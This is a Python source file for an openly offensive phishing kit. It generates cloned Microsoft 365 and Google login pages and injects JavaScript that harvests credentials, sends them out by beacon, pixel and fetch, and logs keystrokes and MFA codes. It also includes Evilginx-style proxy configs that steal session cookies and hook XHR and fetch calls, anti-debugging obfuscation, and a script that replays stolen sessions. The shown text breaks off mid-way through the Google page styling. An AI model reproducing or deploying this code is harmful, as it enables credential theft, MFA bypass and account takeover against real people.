#!/usr/bin/env python3
"""
Advanced Phishing Kit Generator - CyberGhost Framework
=========================================================
AI-Powered Phishing Infrastructure with:
- Landing page generation with AI
- HTML/JS obfuscation engine
- Credential harvester (Selenium/Playwright)
- MFA bypass (Adversary-in-the-Middle)
- Office 365 / Outlook phishing templates
- Evilginx2-style proxy phishing
- QR code phishing (QRishing)
- Browser-in-the-Browser (BitB) attacks

Author: CyberGhost Team
"""

import os
import re
import json
import base64
import hashlib
import random
import string
import secrets
import urllib.parse
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
import html
import zlib

# ==================== ENUMS & CONSTANTS ====================

class PhishingType(Enum):
    CREDENTIAL_HARVEST = "credential_harvest"
    MFA_BYPASS = "mfa_bypass"
    BROWSER_IN_BROWSER = "bitb"
    OAUTH_CONSENT = "oauth_consent"
    QR_PHISHING = "qrishing"
    HTML_SMUGGLING = "html_smuggling"
    CLONE_SITE = "clone_site"
    EVILGINX_PROXY = "evilginx_proxy"


class TargetPlatform(Enum):
    OFFICE365 = "office365"
    GOOGLE = "google"
    LINKEDIN = "linkedin"
    GITHUB = "github"
    AWS = "aws"
    OKTA = "okta"
    AZURE_AD = "azure_ad"
    CUSTOM = "custom"


class ObfuscationLevel(Enum):
    NONE = 0
    BASIC = 1
    MEDIUM = 2
    ADVANCED = 3
    PARANOID = 4


# Brand colors and assets
BRAND_CONFIGS = {
    "office365": {
        "name": "Microsoft 365",
        "primary_color": "#0078d4",
        "secondary_color": "#106ebe",
        "logo_url": "https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo.svg",
        "font": "Segoe UI",
        "login_url": "https://login.microsoftonline.com",
        "mfa_methods": ["authenticator", "sms", "call", "fido2"]
    },
    "google": {
        "name": "Google",
        "primary_color": "#4285f4",
        "secondary_color": "#34a853",
        "logo_url": "https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg",
        "font": "Google Sans, Roboto",
        "login_url": "https://accounts.google.com",
        "mfa_methods": ["authenticator", "prompt", "sms", "security_key"]
    },
    "linkedin": {
        "name": "LinkedIn",
        "primary_color": "#0a66c2",
        "secondary_color": "#004182",
        "logo_url": "https://static.licdn.com/sc/h/95o6rrc5ws6mlw6wqzy0xgj7y",
        "font": "Source Sans Pro",
        "login_url": "https://www.linkedin.com/login",
        "mfa_methods": ["authenticator", "sms"]
    },
    "github": {
        "name": "GitHub",
        "primary_color": "#238636",
        "secondary_color": "#1f2328",
        "logo_url": "https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png",
        "font": "-apple-system, BlinkMacSystemFont, Segoe UI",
        "login_url": "https://github.com/login",
        "mfa_methods": ["authenticator", "sms", "security_key"]
    },
    "okta": {
        "name": "Okta",
        "primary_color": "#007dc1",
        "secondary_color": "#00297a",
        "logo_url": "https://www.okta.com/sites/default/files/Okta_Logo_BrightBlue_Medium.png",
        "font": "proxima-nova",
        "login_url": "https://login.okta.com",
        "mfa_methods": ["okta_verify", "sms", "call", "email"]
    },
    "aws": {
        "name": "Amazon Web Services",
        "primary_color": "#ff9900",
        "secondary_color": "#232f3e",
        "logo_url": "https://a0.awsstatic.com/libra-css/images/logos/aws_logo_smile_1200x630.png",
        "font": "Amazon Ember",
        "login_url": "https://signin.aws.amazon.com",
        "mfa_methods": ["authenticator", "hardware_mfa"]
    }
}


# ==================== DATA CLASSES ====================

@dataclass
class PhishingCampaign:
    """Phishing campaign configuration"""
    id: str
    name: str
    target_platform: TargetPlatform
    phishing_type: PhishingType
    target_emails: List[str] = field(default_factory=list)
    landing_page_url: str = ""
    exfil_endpoint: str = ""
    obfuscation_level: ObfuscationLevel = ObfuscationLevel.MEDIUM
    mfa_bypass_enabled: bool = False
    created_at: datetime = field(default_factory=datetime.now)
    expires_at: Optional[datetime] = None
    collected_creds: List[Dict] = field(default_factory=list)
    

@dataclass
class HarvestedCredential:
    """Captured credential data"""
    timestamp: datetime
    email: str
    password: str
    mfa_token: Optional[str] = None
    session_cookies: Optional[Dict] = None
    user_agent: str = ""
    ip_address: str = ""
    geolocation: Optional[Dict] = None
    additional_data: Dict = field(default_factory=dict)


# ==================== JS OBFUSCATION ENGINE ====================

class JSObfuscator:
    """Advanced JavaScript obfuscation engine"""
    
    def __init__(self, level: ObfuscationLevel = ObfuscationLevel.MEDIUM):
        self.level = level
        self.var_map = {}
        self.string_array = []
        
    def obfuscate(self, js_code: str) -> str:
        """Main obfuscation entry point"""
        if self.level == ObfuscationLevel.NONE:
            return js_code
            
        # Stage 1: String extraction and encoding
        js_code = self._extract_strings(js_code)
        
        # Stage 2: Variable renaming
        if self.level.value >= ObfuscationLevel.BASIC.value:
            js_code = self._rename_variables(js_code)
            
        # Stage 3: Control flow flattening
        if self.level.value >= ObfuscationLevel.MEDIUM.value:
            js_code = self._flatten_control_flow(js_code)
            
        # Stage 4: Dead code injection
        if self.level.value >= ObfuscationLevel.ADVANCED.value:
            js_code = self._inject_dead_code(js_code)
            
        # Stage 5: Self-defending code
        if self.level.value >= ObfuscationLevel.PARANOID.value:
            js_code = self._add_self_defense(js_code)
            
        # Wrap with string decoder
        js_code = self._wrap_with_decoder(js_code)
        
        return js_code
    
    def _extract_strings(self, code: str) -> str:
        """Extract strings to array for obfuscation"""
        string_pattern = r'(["\'])(?:(?!\1|\\).|\\.)*\1'
        strings = re.findall(string_pattern, code)
        
        for i, s in enumerate(set(strings)):
            if len(s) > 3:
                encoded = self._encode_string(s)
                self.string_array.append(encoded)
                var_name = f'_0x{secrets.token_hex(2)}'
                code = code.replace(s, f'{var_name}[{i}]')
                
        return code
    
    def _encode_string(self, s: str) -> str:
        """Encode string using multiple techniques"""
        # Base64 + XOR
        key = random.randint(1, 255)
        encoded = ''.join(chr(ord(c) ^ key) for c in s)
        b64 = base64.b64encode(encoded.encode()).decode()
        return f"atob('{b64}').split('').map(c=>String.fromCharCode(c.charCodeAt(0)^{key})).join('')"
    
    def _rename_variables(self, code: str) -> str:
        """Rename variables to meaningless names"""
        var_pattern = r'\b(var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)'
        
        def replace_var(match):
            keyword = match.group(1)
            var_name = match.group(2)
            if var_name not in self.var_map:
                self.var_map[var_name] = f'_0x{secrets.token_hex(3)}'
            return f'{keyword} {self.var_map[var_name]}'
        
        return re.sub(var_pattern, replace_var, code)
    
    def _flatten_control_flow(self, code: str) -> str:
        """Flatten control flow with switch statements"""
        # Add state machine wrapper
        wrapper = """
        (function(){
            var _state = 0;
            while(true){
                switch(_state){
                    case 0: %s; _state = -1; break;
                    default: return;
                }
            }
        })();
        """
        return wrapper % code
    
    def _inject_dead_code(self, code: str) -> str:
        """Inject dead/unreachable code"""
        dead_snippets = [
            "if(false){console.log('debug');}",
            "var _dead = function(){return Math.random() > 2;};",
            "try{}catch(_e){throw _e;}",
            "for(var _i=0;_i<0;_i++){}",
        ]
        
        lines = code.split(';')
        for i in range(0, len(lines), 3):
            lines.insert(i, random.choice(dead_snippets))
        
        return ';'.join(lines)
    
    def _add_self_defense(self, code: str) -> str:
        """Add anti-debugging and anti-tampering"""
        defense = """
        (function(){
            // Anti-debugging
            setInterval(function(){
                var start = Date.now();
                debugger;
                if(Date.now() - start > 100){
                    window.location = 'about:blank';
                }
            }, 1000);
            
            // Anti-devtools
            var devtools = {open: false};
            var threshold = 160;
            setInterval(function(){
                if(window.outerWidth - window.innerWidth > threshold ||
                   window.outerHeight - window.innerHeight > threshold){
                    devtools.open = true;
                    document.body.innerHTML = '';
                }
            }, 500);
            
            // Disable right-click
            document.addEventListener('contextmenu', e => e.preventDefault());
            
            // Disable keyboard shortcuts
            document.addEventListener('keydown', function(e){
                if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')){
                    e.preventDefault();
                }
            });
        })();
        """
        return defense + code
    
    def _wrap_with_decoder(self, code: str) -> str:
        """Wrap with string array decoder"""
        if not self.string_array:
            return code
            
        array_code = f"var _strings = [{','.join(self.string_array)}];"
        return array_code + code


# ==================== HTML OBFUSCATION ENGINE ====================

class HTMLObfuscator:
    """HTML obfuscation and evasion techniques"""
    
    def __init__(self, level: ObfuscationLevel = ObfuscationLevel.MEDIUM):
        self.level = level
        self.js_obfuscator = JSObfuscator(level)
    
    def obfuscate(self, html_content: str) -> str:
        """Obfuscate HTML content"""
        if self.level == ObfuscationLevel.NONE:
            return html_content
        
        # Obfuscate inline scripts
        html_content = self._obfuscate_scripts(html_content)
        
        # Encode sensitive strings
        if self.level.value >= ObfuscationLevel.BASIC.value:
            html_content = self._encode_strings(html_content)
        
        # Add decoy elements
        if self.level.value >= ObfuscationLevel.MEDIUM.value:
            html_content = self._add_decoys(html_content)
        
        # Fragment and reassemble
        if self.level.value >= ObfuscationLevel.ADVANCED.value:
            html_content = self._fragment_html(html_content)
        
        return html_content
    
    def _obfuscate_scripts(self, html: str) -> str:
        """Obfuscate inline JavaScript"""
        script_pattern = r'<script[^>]*>(.*?)</script>'
        
        def obfuscate_match(match):
            js_code = match.group(1)
            if js_code.strip():
                obfuscated = self.js_obfuscator.obfuscate(js_code)
                return f'<script>{obfuscated}</script>'
            return match.group(0)
        
        return re.sub(script_pattern, obfuscate_match, html, flags=re.DOTALL)
    
    def _encode_strings(self, html: str) -> str:
        """Encode text content using HTML entities"""
        # Encode suspicious words
        suspicious = ['password', 'login', 'credential', 'verify', 'account']
        for word in suspicious:
            encoded = ''.join(f'&#x{ord(c):x};' for c in word)
            html = re.sub(word, encoded, html, flags=re.IGNORECASE)
        return html
    
    def _add_decoys(self, html: str) -> str:
        """Add invisible decoy elements"""
        decoys = [
            '<div style="position:absolute;left:-9999px;">Legitimate Microsoft Page</div>',
            '<input type="hidden" name="legitimate_form" value="true">',
            '<meta name="robots" content="noindex, nofollow">',
            '<!-- This is a legitimate login page -->',
        ]
        
        # Insert decoys randomly
        insert_pos = html.find('<body')
        if insert_pos > 0:
            insert_pos = html.find('>', insert_pos) + 1
            html = html[:insert_pos] + '\n'.join(decoys) + html[insert_pos:]
        
        return html
    
    def _fragment_html(self, html: str) -> str:
        """Fragment HTML and reassemble with JavaScript"""
        # Split into chunks
        chunks = [html[i:i+100] for i in range(0, len(html), 100)]
        encoded_chunks = [base64.b64encode(chunk.encode()).decode() for chunk in chunks]
        
        loader = f"""
        <!DOCTYPE html>
        <html>
        <head><meta charset="UTF-8"></head>
        <body>
        <script>
        var _c = {json.dumps(encoded_chunks)};
        var _h = _c.map(function(c){{return atob(c);}}).join('');
        document.open();
        document.write(_h);
        document.close();
        </script>
        </body>
        </html>
        """
        return loader


# ==================== CREDENTIAL HARVESTER ====================

class CredentialHarvester:
    """Credential harvesting and exfiltration"""
    
    def __init__(self, exfil_endpoint: str = "/api/collect"):
        self.exfil_endpoint = exfil_endpoint
        self.collected: List[HarvestedCredential] = []
    
    def generate_harvester_js(self, form_selector: str = "form", 
                              include_keylogger: bool = False) -> str:
        """Generate credential harvesting JavaScript"""
        
        js_code = f"""
        (function() {{
            'use strict';
            
            var EXFIL_ENDPOINT = '{self.exfil_endpoint}';
            var collectedData = {{}};
            
            // Fingerprint collection
            function getFingerprint() {{
                return {{
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    screenRes: screen.width + 'x' + screen.height,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(',')
                }};
            }}
            
            // Exfiltrate data
            function exfiltrate(data) {{
                data.fingerprint = getFingerprint();
                data.timestamp = new Date().toISOString();
                data.pageUrl = window.location.href;
                data.referrer = document.referrer;
                
                // Primary: Beacon API (fire and forget)
                if (navigator.sendBeacon) {{
                    navigator.sendBeacon(EXFIL_ENDPOINT, JSON.stringify(data));
                }}
                
                // Fallback: Image pixel
                var img = new Image();
                img.src = EXFIL_ENDPOINT + '?d=' + encodeURIComponent(btoa(JSON.stringify(data)));
                
                // Fallback 2: Fetch with keepalive
                try {{
                    fetch(EXFIL_ENDPOINT, {{
                        method: 'POST',
                        body: JSON.stringify(data),
                        headers: {{'Content-Type': 'application/json'}},
                        keepalive: true
                    }});
                }} catch(e) {{}}
            }}
            
            // Form interception
            document.querySelectorAll('{form_selector}').forEach(function(form) {{
                form.addEventListener('submit', function(e) {{
                    var formData = new FormData(form);
                    var data = {{}};
                    formData.forEach(function(value, key) {{
                        data[key] = value;
                    }});
                    
                    // Get specific fields
                    var emailField = form.querySelector('input[type="email"], input[name*="email"], input[name*="user"]');
                    var passField = form.querySelector('input[type="password"]');
                    
                    if (emailField) data.email = emailField.value;
                    if (passField) data.password = passField.value;
                    
                    exfiltrate({{type: 'credential', ...data}});
                }});
            }});
            
            // Input monitoring
            document.querySelectorAll('input[type="password"], input[type="email"], input[name*="user"]').forEach(function(input) {{
                input.addEventListener('blur', function() {{
                    if (this.value) {{
                        exfiltrate({{
                            type: 'input_capture',
                            field: this.name || this.type,
                            value: this.value
                        }});
                    }}
                }});
            }});
        """
        
        if include_keylogger:
            js_code += """
            // Keylogger (focused inputs only)
            var keyBuffer = '';
            var lastField = '';
            
            document.addEventListener('keypress', function(e) {
                var target = e.target;
                if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
                    if (lastField !== target.name) {
                        if (keyBuffer) {
                            exfiltrate({type: 'keylog', field: lastField, keys: keyBuffer});
                        }
                        keyBuffer = '';
                        lastField = target.name;
                    }
                    keyBuffer += e.key;
                }
            });
            
            // Flush buffer periodically
            setInterval(function() {
                if (keyBuffer) {
                    exfiltrate({type: 'keylog', field: lastField, keys: keyBuffer});
                    keyBuffer = '';
                }
            }, 5000);
            """
        
        js_code += "\n})();"
        return js_code
    
    def generate_mfa_interceptor_js(self) -> str:
        """Generate MFA token interception JavaScript"""
        return """
        (function() {
            'use strict';
            
            var EXFIL_ENDPOINT = '""" + self.exfil_endpoint + """';
            
            // OTP/MFA field detection patterns
            var mfaPatterns = [
                'input[name*="otp"]',
                'input[name*="code"]',
                'input[name*="token"]',
                'input[name*="2fa"]',
                'input[name*="mfa"]',
                'input[name*="verification"]',
                'input[name*="totp"]',
                'input[autocomplete="one-time-code"]',
                'input[inputmode="numeric"][maxlength="6"]'
            ];
            
            function interceptMFA() {
                mfaPatterns.forEach(function(pattern) {
                    document.querySelectorAll(pattern).forEach(function(input) {
                        if (!input.dataset.intercepted) {
                            input.dataset.intercepted = 'true';
                            
                            // Monitor value changes
                            var lastValue = '';
                            setInterval(function() {
                                if (input.value !== lastValue && input.value.length >= 4) {
                                    lastValue = input.value;
                                    exfilMFA(input.value, input.name);
                                }
                            }, 100);
                            
                            // Intercept on blur/submit
                            input.addEventListener('blur', function() {
                                if (this.value) exfilMFA(this.value, this.name);
                            });
                        }
                    });
                });
            }
            
            function exfilMFA(code, fieldName) {
                var data = {
                    type: 'mfa_token',
                    code: code,
                    field: fieldName,
                    timestamp: new Date().toISOString()
                };
                
                navigator.sendBeacon && navigator.sendBeacon(EXFIL_ENDPOINT, JSON.stringify(data));
            }
            
            // Run immediately and observe DOM changes
            interceptMFA();
            
            var observer = new MutationObserver(function() {
                interceptMFA();
            });
            
            observer.observe(document.body, {childList: true, subtree: true});
        })();
        """


# ==================== MFA BYPASS (ADVERSARY-IN-THE-MIDDLE) ====================

class MFABypassEngine:
    """Adversary-in-the-Middle MFA bypass engine"""
    
    def __init__(self, target_platform: TargetPlatform):
        self.platform = target_platform
        self.config = BRAND_CONFIGS.get(target_platform.value, {})
        self.session_store: Dict[str, Dict] = {}
    
    def generate_aitm_config(self) -> Dict:
        """Generate Evilginx2-style phishlet configuration"""
        
        if self.platform == TargetPlatform.OFFICE365:
            return {
                "name": "o365",
                "author": "cyberghost",
                "min_ver": "3.0.0",
                "proxy_hosts": [
                    {"phish_sub": "login", "orig_sub": "login", "domain": "microsoftonline.com", "session": True, "is_landing": True},
                    {"phish_sub": "www", "orig_sub": "www", "domain": "office.com", "session": True},
                    {"phish_sub": "aadcdn", "orig_sub": "aadcdn", "domain": "msftauth.net", "session": False}
                ],
                "sub_filters": [
                    {"triggers_on": "login.microsoftonline.com", "orig_sub": "login", "domain": "microsoftonline.com", "search": "login.microsoftonline.com", "replace": "login.{hostname}", "mimes": ["text/html", "application/json", "application/javascript"]},
                    {"triggers_on": "login.microsoftonline.com", "orig_sub": "login", "domain": "microsoftonline.com", "search": "login.microsoft.com", "replace": "login.{hostname}", "mimes": ["text/html", "application/json"]}
                ],
                "auth_tokens": [
                    {"domain": ".login.microsoftonline.com", "keys": ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"]},
                    {"domain": ".microsoftonline.com", "keys": ["ESTSAUTH", "ESTSAUTHPERSISTENT"]},
                    {"domain": ".office.com", "keys": ["OIDCAuth*"]}
                ],
                "credentials": {
                    "username": {"key": "login", "search": '("login":"([^"]*)")', "type": "json"},
                    "password": {"key": "passwd", "search": '("passwd":"([^"]*)")', "type": "json"}
                },
                "login": {"domain": "login.microsoftonline.com", "path": "/common/oauth2/authorize"},
                "js_inject": self._generate_aitm_js()
            }
        
        elif self.platform == TargetPlatform.GOOGLE:
            return {
                "name": "google",
                "proxy_hosts": [
                    {"phish_sub": "accounts", "orig_sub": "accounts", "domain": "google.com", "session": True, "is_landing": True},
                    {"phish_sub": "myaccount", "orig_sub": "myaccount", "domain": "google.com", "session": True}
                ],
                "auth_tokens": [
                    {"domain": ".google.com", "keys": ["SID", "HSID", "SSID", "APISID", "SAPISID", "LSID"]},
                    {"domain": "accounts.google.com", "keys": ["GAPS", "__Host-GAPS"]}
                ],
                "credentials": {
                    "username": {"key": "Email", "search": 'identifier=([^&]*)', "type": "post"},
                    "password": {"key": "Passwd", "search": 'Passwd=([^&]*)', "type": "post"}
                },
                "js_inject": self._generate_aitm_js()
            }
        
        return {"error": "Platform not supported for AiTM"}
    
    def _generate_aitm_js(self) -> str:
        """Generate JavaScript for real-time session hijacking"""
        return """
        (function() {
            // Cookie exfiltration
            function exfilCookies() {
                var cookies = document.cookie;
                var data = {
                    type: 'session_cookies',
                    cookies: cookies,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                };
                
                fetch('/api/aitm/cookies', {
                    method: 'POST',
                    body: JSON.stringify(data),
                    headers: {'Content-Type': 'application/json'}
                });
            }
            
            // Monitor for auth completion
            function checkAuth() {
                var authIndicators = [
                    '.ms-signIn-complete',
                    '#success-message',
                    '.auth-complete',
                    '[data-testid="auth-success"]'
                ];
                
                authIndicators.forEach(function(sel) {
                    if (document.querySelector(sel)) {
                        exfilCookies();
                    }
                });
            }
            
            // Hook XMLHttpRequest
            var origXHR = window.XMLHttpRequest;
            window.XMLHttpRequest = function() {
                var xhr = new origXHR();
                var origOpen = xhr.open;
                var origSend = xhr.send;
                
                xhr.open = function() {
                    this._url = arguments[1];
                    origOpen.apply(this, arguments);
                };
                
                xhr.send = function(body) {
                    if (body && (this._url.includes('token') || this._url.includes('auth'))) {
                        fetch('/api/aitm/intercept', {
                            method: 'POST',
                            body: JSON.stringify({url: this._url, body: body}),
                            headers: {'Content-Type': 'application/json'}
                        });
                    }
                    origSend.apply(this, arguments);
                };
                
                return xhr;
            };
            
            // Hook Fetch API
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if (url.includes('token') || url.includes('oauth')) {
                    fetch('/api/aitm/intercept', {
                        method: 'POST',
                        body: JSON.stringify({url: url, options: options}),
                        headers: {'Content-Type': 'application/json'}
                    });
                }
                return origFetch.apply(this, arguments);
            };
            
            // Periodic check
            setInterval(checkAuth, 1000);
            
            // Exfil on page unload
            window.addEventListener('beforeunload', exfilCookies);
        })();
        """
    
    def generate_session_replay_script(self, stolen_cookies: Dict) -> str:
        """Generate script to replay stolen session"""
        cookie_string = "; ".join([f"{k}={v}" for k, v in stolen_cookies.items()])
        
        return f"""
        # Python session replay
        import requests
        
        session = requests.Session()
        session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        
        # Inject stolen cookies
        for cookie in {json.dumps(stolen_cookies)}.items():
            session.cookies.set(cookie[0], cookie[1])
        
        # Access protected resource
        response = session.get('{self.config.get("login_url", "https://target.com")}')
        print(f"Session valid: {{response.status_code == 200}}")
        print(f"Response: {{response.text[:500]}}")
        """


# ==================== LANDING PAGE GENERATOR ====================

class LandingPageGenerator:
    """AI-powered phishing landing page generator"""
    
    def __init__(self, platform: TargetPlatform, 
                 obfuscation: ObfuscationLevel = ObfuscationLevel.MEDIUM):
        self.platform = platform
        self.config = BRAND_CONFIGS.get(platform.value, {})
        self.obfuscation = obfuscation
        self.html_obfuscator = HTMLObfuscator(obfuscation)
        self.harvester = CredentialHarvester()
    
    def generate(self, custom_message: str = "", 
                 include_mfa: bool = False,
                 redirect_url: str = "") -> str:
        """Generate complete phishing landing page"""
        
        if self.platform == TargetPlatform.OFFICE365:
            html = self._generate_o365_page(custom_message, include_mfa)
        elif self.platform == TargetPlatform.GOOGLE:
            html = self._generate_google_page(custom_message, include_mfa)
        elif self.platform == TargetPlatform.LINKEDIN:
            html = self._generate_linkedin_page(custom_message)
        elif self.platform == TargetPlatform.GITHUB:
            html = self._generate_github_page(custom_message)
        else:
            html = self._generate_generic_page(custom_message)
        
        # Add harvester JavaScript
        harvester_js = self.harvester.generate_harvester_js()
        if include_mfa:
            harvester_js += self.harvester.generate_mfa_interceptor_js()
        
        # Inject scripts
        html = html.replace('</body>', f'<script>{harvester_js}</script></body>')
        
        # Add redirect logic
        if redirect_url:
            redirect_js = f"""
            <script>
            document.querySelector('form').addEventListener('submit', function(e) {{
                setTimeout(function() {{
                    window.location.href = '{redirect_url}';
                }}, 1500);
            }});
            </script>
            """
            html = html.replace('</body>', redirect_js + '</body>')
        
        # Apply obfuscation
        html = self.html_obfuscator.obfuscate(html)
        
        return html
    
    def _generate_o365_page(self, message: str, include_mfa: bool) -> str:
        """Generate Microsoft 365 phishing page"""
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .login-container {{
            background: #ffffff;
            padding: 44px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }}
        .logo {{
            margin-bottom: 16px;
        }}
        .logo img {{
            height: 24px;
        }}
        h1 {{
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 4px;
        }}
        .subtitle {{
            color: #1b1b1b;
            font-size: 15px;
            margin-bottom: 24px;
        }}
        .form-group {{
            margin-bottom: 16px;
        }}
        .form-group label {{
            display: block;
            color: #1b1b1b;
            font-size: 14px;
            margin-bottom: 4px;
        }}
        .form-group input {{
            width: 100%;
            padding: 8px 10px;
            border: 1px solid #8c8c8c;
            border-radius: 0;
            font-size: 15px;
            outline: none;
        }}
        .form-group input:focus {{
            border-color: #0078d4;
        }}
        .btn-primary {{
            width: 100%;
            padding: 10px;
            background: #0067b8;
            color: #fff;
            border: none;
            font-size: 15px;
            cursor: pointer;
            margin-top: 24px;
        }}
        .btn-primary:hover {{
            background: #005a9e;
        }}
        .links {{
            margin-top: 16px;
        }}
        .links a {{
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
        }}
        .message {{
            background: #fff4ce;
            border-left: 4px solid #d83b01;
            padding: 12px;
            margin-bottom: 16px;
            font-size: 13px;
        }}
        .mfa-section {{
            display: none;
            margin-top: 20px;
        }}
        .mfa-section.active {{
            display: block;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24">
                <path fill="#737373" d="M44.836 4.6v14.8h-2.4V7.583H42.4L38.119 19.4h-1.588l-4.313-11.817h-.036V19.4h-2.251V4.6h3.3l3.947 11.1h.072l4.133-11.1zM47.075 6.188a1.391 1.391 0 1 1 1.391 1.391 1.385 1.385 0 0 1-1.391-1.388zm.256 3.164h2.251V19.4h-2.251zM58.551 13.2a6.673 6.673 0 0 0-.142-1.615 2.1 2.1 0 0 0-2.215-1.752 2.476 2.476 0 0 0-2.579 2.723v6.84h-2.251V9.352h2.143v1.463h.036a3.818 3.818 0 0 1 3.335-1.715c2.9 0 3.839 2.034 3.839 4.748v5.548h-2.251V13.2zM67.164 9.1c2.9 0 4.932 2.143 4.932 5.3s-2.034 5.256-4.932 5.256-4.932-2.107-4.932-5.256S64.266 9.1 67.164 9.1zm0 8.589c1.806 0 2.615-1.535 2.615-3.335s-.809-3.3-2.615-3.3-2.615 1.5-2.615 3.3.807 3.335 2.615 3.335zM78.6 9.1a3.349 3.349 0 0 1 3.011 1.607h.036V9.352h2.143v10.08c0 3.263-1.9 4.568-4.644 4.568a5.6 5.6 0 0 1-4.064-1.427l1.211-1.643a4.027 4.027 0 0 0 2.8 1.139c1.679 0 2.579-.953 2.579-2.723v-1.247h-.036a3.418 3.418 0 0 1-3.011 1.535c-2.651 0-4.133-2.143-4.133-5.04.001-2.861 1.483-5.094 4.108-5.094zm.5 8.157c1.571 0 2.507-1.319 2.507-3.119 0-1.752-.827-3.155-2.507-3.155s-2.4 1.463-2.4 3.155c0 1.736.737 3.119 2.4 3.119zM90.793 11.208a5.012 5.012 0 0 0-1.931-.377c-.881 0-1.679.269-1.679 1.067 0 1.786 4.356.726 4.356 4.208 0 2.251-1.967 3.551-4.208 3.551a8.026 8.026 0 0 1-2.975-.593l.305-1.931a4.729 4.729 0 0 0 2.471.773c.809 0 1.895-.305 1.895-1.211 0-2.107-4.356-.846-4.356-4.208 0-2.071 1.859-3.371 4.064-3.371a6.781 6.781 0 0 1 2.471.377zM97.163 9.1c2.9 0 4.932 2.143 4.932 5.3s-2.034 5.256-4.932 5.256-4.932-2.107-4.932-5.256S94.265 9.1 97.163 9.1zm0 8.589c1.806 0 2.615-1.535 2.615-3.335s-.809-3.3-2.615-3.3-2.615 1.5-2.615 3.3.808 3.335 2.615 3.335zM105.752 11.064h-2.291V9.352h2.291V6.512h2.215v2.84h2.9v1.712h-2.9v5.076a1.4 1.4 0 0 0 1.571 1.571 2.749 2.749 0 0 0 1.211-.269l.072 1.859a4.886 4.886 0 0 1-1.859.341c-2.4 0-3.21-1.247-3.21-3.3v-5.278z"/>
                <path fill="#f25022" d="M0 0h11.377v11.377H0z"/>
                <path fill="#00a4ef" d="M0 12.623h11.377V24H0z"/>
                <path fill="#7fba00" d="M12.623 0H24v11.377H12.623z"/>
                <path fill="#ffb900" d="M12.623 12.623H24V24H12.623z"/>
            </svg>
        </div>
        
        <h1>Sign in</h1>
        
        {f'<div class="message">{html.escape(message)}</div>' if message else ''}
        
        <form id="loginForm" action="/api/collect" method="POST">
            <div class="form-group">
                <input type="email" name="loginfmt" id="email" placeholder="Email, phone, or Skype" required autocomplete="username">
            </div>
            
            <div class="form-group password-group" style="display:none;">
                <input type="password" name="passwd" id="password" placeholder="Password" autocomplete="current-password">
            </div>
            
            {'<div class="mfa-section" id="mfaSection"><div class="form-group"><label>Enter the code from your authenticator app</label><input type="text" name="otc" id="mfaCode" placeholder="Code" maxlength="6" inputmode="numeric" autocomplete="one-time-code"></div></div>' if include_mfa else ''}
            
            <button type="submit" class="btn-primary">Next</button>
            
            <div class="links">
                <a href="#">Can't access your account?</a>
            </div>
        </form>
    </div>
    
    <script>
        var step = 1;
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            if (step === 1) {{
                e.preventDefault();
                document.querySelector('.password-group').style.display = 'block';
                document.getElementById('password').required = true;
                document.getElementById('email').readOnly = true;
                document.querySelector('.btn-primary').textContent = 'Sign in';
                step = 2;
                document.getElementById('password').focus();
            }} {'else if (step === 2 && document.getElementById("mfaSection")) {{ e.preventDefault(); document.getElementById("mfaSection").classList.add("active"); document.getElementById("mfaCode").required = true; document.querySelector(".btn-primary").textContent = "Verify"; step = 3; document.getElementById("mfaCode").focus(); }}' if include_mfa else ''}
        }});
    </script>
</body>
</html>'''

    def _generate_google_page(self, message: str, include_mfa: bool) -> str:
        """Generate Google phishing page"""
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .container {{
            max-width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 16px;
        }}
        .logo svg {{ height: 24px; }}
        h1 {{
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }}
        .subtitle {{
            text-align: center;
            color: #202124;
            font-size: 16px;
            margin-bottom: 24px;
        }}
        .form-group {{
            margin-bottom: 24px;
        }}
        .form-group input {{
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
        }}
        .form-group input:focus {{
            border-color: #1a73e8;
            border-width: 2px;
